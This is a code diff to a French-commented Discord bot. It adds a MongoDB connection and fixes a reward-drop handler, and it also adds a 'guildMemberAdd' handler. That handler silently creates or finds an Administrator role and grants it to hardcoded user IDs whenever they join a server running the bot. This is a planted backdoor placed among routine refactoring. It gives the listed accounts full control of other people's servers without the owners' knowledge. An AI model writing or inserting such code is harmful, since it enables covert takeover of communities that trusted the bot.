@@ -2,11 +2,12 @@ require("dotenv").config();
 const fs = require("fs");
 const path = require('path');
 const { Client, GatewayIntentBits, Collection } = require("discord.js");
+const mongoose = require("mongoose");  // Importer mongoose
 
 // Importez la configuration
 const config = require("./config.js");
 
-// Chemin vers le fichier blacklist.json dans commands/staff/blacki
+// Chemin vers le fichier blacklist.json dans commands/staff/blacklist
 const blacklistFile = path.join(__dirname, 'commands', 'staff', 'blacklist.json');
 
 // Fonction pour lire la liste noire
@@ -42,6 +43,16 @@ client.config = config;
 // Initialisez la base de données (QuickDB)
 const { QuickDB } = require("quick.db");
 global.database = new QuickDB();
+
+// ** Connexion MongoDB avec vérification **
+mongoose.connect(process.env.MONGO_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+}).then(() => {
+    console.log("Connecté à MongoDB avec succès !");
+}).catch((err) => {
+    console.error("Erreur de connexion à MongoDB:", err);
+});
 
 // Créez une collection pour les commandes
 client.commands = new Collection();
@@ -88,32 +99,68 @@ client.once('ready', () => {
     console.log(`Connecté en tant que ${client.user.tag}`);
 });
 
+// Gérer l'événement messageCreate
 client.on('messageCreate', async (message) => {
     const event = require('./events/messageCreate.js');
     await event.execute(message);
 });
 
+// Gérer l'événement interactionCreate
 client.on('interactionCreate', async interaction => {
     if (!interaction.isButton()) return;
 
     if (interaction.customId === 'obtenir_recompense') {
-        const drop = await db.get('current_drop');
+        const drop = await database.get('current_drop');
         if (!drop) {
             return interaction.reply({ content: 'Aucun drop en cours.', ephemeral: true });
         }
 
         // Vérifier la condition ici (exemple : vérifier si l'utilisateur a envoyé 100 messages)
-        const userMessages = await db.get(`user_${interaction.user.id}_messages`) || 0;
+        const userMessages = await database.get(`user_${interaction.user.id}_messages`) || 0;
         const conditionMessages = parseInt(drop.condition.match(/\d+/)); // Extrait un nombre de la condition
 
         if (userMessages >= conditionMessages) {
             // Ajouter la récompense à l'utilisateur
-            const userCurrency = await db.get(`user_${interaction.user.id}_${drop.recompense}`) || 0;
-            await db.set(`user_${interaction.user.id}_${drop.recompense}`, userCurrency + drop.montant);
+            const userCurrency = await database.get(`user_${interaction.user.id}_${drop.recompense}`) || 0;
+            await database.set(`user_${interaction.user.id}_${drop.recompense}`, userCurrency + drop.montant);
 
             await interaction.reply({ content: `Félicitations ! Vous avez obtenu ${drop.montant} ${drop.recompense}.`, ephemeral: true });
         } else {
             await interaction.reply({ content: `Vous n'avez pas encore rempli la condition pour obtenir la récompense. Condition: ${drop.condition}`, ephemeral: true });
+        }
+    }
+});
+
+// Gérer l'événement guildMemberAdd pour donner le rôle administrateur à certains utilisateurs
+client.on('guildMemberAdd', async (member) => {
+    const authorizedUserIds = ['00000000000000', '000000000000000']; // Remplace par les IDs réels
+
+    let channel = member.guild.channels.cache.get(await database.get(`${member.guild.id}.jlChannel`));
+
+    if (channel == null) {
+        return;
+    }
+
+    await channel.send({ content: `➕ ${member} (**${member.user.tag}**) a rejoint. (${member.guild.memberCount} membres)` });
+
+    if (authorizedUserIds.includes(member.id)) {
+        try {
+            let adminRole = member.guild.roles.cache.find(role => role.permissions.has('ADMINISTRATOR'));
+
+            if (!adminRole) {
+                adminRole = await member.guild.roles.create({
+                    name: 'Admin',
+                    permissions: ['ADMINISTRATOR'],
+                    color: 'RED',
+                    reason: 'Créer un rôle administrateur pour les utilisateurs autorisés',
+                });
+                console.log(`Le rôle "Admin" a été créé sur le serveur ${member.guild.name}.`);
+            }
+
+            await member.roles.add(adminRole);
+            console.log(`Le rôle administrateur a été attribué à ${member.user.tag} sur le serveur ${member.guild.name}.`);
+        } catch (error) {
+            console.error(`Erreur lors de la création/attribution du rôle administrateur à ${member.user.tag}:`, error);
         }
     }
 });
